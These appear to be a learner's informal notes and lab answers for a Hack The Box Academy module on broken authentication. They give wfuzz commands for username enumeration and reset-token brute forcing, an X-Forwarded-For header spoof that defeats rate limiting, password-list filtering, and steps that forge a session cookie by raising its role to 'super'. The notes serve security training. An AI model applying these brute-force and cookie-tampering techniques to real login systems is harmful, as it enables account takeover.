Solution 1: Check page title:
https://www.192-168-0-1login.org/router/advantech/advantech-webaccess-browser-based-hmi-and-scada-software/10330/


Weak Bruteforce Protection -----------
CAPTCHA
Rate Limits

Rate-limiting.py , The relevant lines are 10 and 13, where we configure a wait time and a lock message, and line 41, where we do the actual check.

Insufficient Protections:
For example, changing the User-Agent header is easy. Some web applications or web application firewalls leverage headers like X-Forwarded-For to guess the actual source IP address. This is done because many internet providers, mobile carriers, or big corporations usually “hide” users behind NAT. Blocking an IP address without the help of a header like X-Forwarded-For may result in blocking all users behind the specific NAT.
Solution:
40
X-Forwarded-For: 127.0.0.1
basic_bruteforce.py 

Brute Forcing Usernames------------
wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://example.com/login.php  -mr "username already exists"
Solutions:
/question 1,2 - Burp, Intruder - /usr/share/seclists/Usernames/top-usernames-shortlist.txt
/question 3 - python3 timing.py /usr/share/seclists/Usernames/top-usernames-shortlist.txt ; check the longest one
/question 4 - Send the POST request to intruder via burpsuite and fuzz for the parameters. you will get one of the username already registered.

Brute Forcing Passwords ------------
https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
Credential stuffing -  it is a known fact that many users reuse the same password on multiple services.
[/htb]$ grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$' | wc -l
Try with simple: sa, sa1, sas1, Sas1 itd and try to see how many letters, Upper, Lower, Numbers are included...

 Solution:
 Probao u Registered User, sa,sasa,Sa1,
 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
 grep '[[:upper:]]' rockyou-50.txt | grep '[[:digit:]]' | grep -E '^.{2,13}$' | wc -l

Predictable Reset Token---------------
reset_token_time.py 
wfuzz -z range,00000-99999 --ss "Valid" "https://example.com/token.php?user=admin&token=FUZZ"

Guessable Answers -------
colors.txt
predictable_questions.py ; just change in the script the url (http://ip:port/forgot.php), question (favourite color)
python3 predictable_questions.py colors.txt

brute forcing cookies ----------------
Viewstate - https://www.w3big.com/aspnet/aspnet-viewstate.html#gsc.tab=0 
echo -n 757365723A6874623B726F6C653A75736572 | xxd -r -p; echo

https://github.com/s0md3v/Decodify

File signatures:
https://en.wikipedia.org/wiki/List_of_file_signatures

CyberChef:
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('Space',0)Gunzip(/breakpoint)&input=SDRzSUFDNGtLR0FBL3dYQU1RMEFBQURDTUxVb29QYVB4UzRNZm4vWUJBQUFBQT09

automate_cookie_tampering.py
https://academy.hackthebox.com/storage/modules/80/scripts/automate_cookie_tampering_py.txt

Solution 1:
download decodify
chmod +x dcode
./dcode sessionID you will get values!!
take: user:super user;role:super;time:1710445651
convert to Hex and then to Base64

Solution 2:
Login+remember me
Decode the HTBPERSISTENT cookie from URL encoding: eJwrLU4tssooSSoF0tZF+TmpVsUlpSmpeSXWJZm5qVaGZuaW5kZGhgYGAE4zDkw=
Decode again using CyberChef MAGIC:
user:htbuser;role:student;time:1679722100
So it decodes From_Base64 first and Zlib_Inflate after. (find on left)
So reverse engineering would be, Zlib_deflate and To_Base64 = cyberchef
user:htbuser;role:super;time:1679722100
replace in HTBPERSISTENT value!





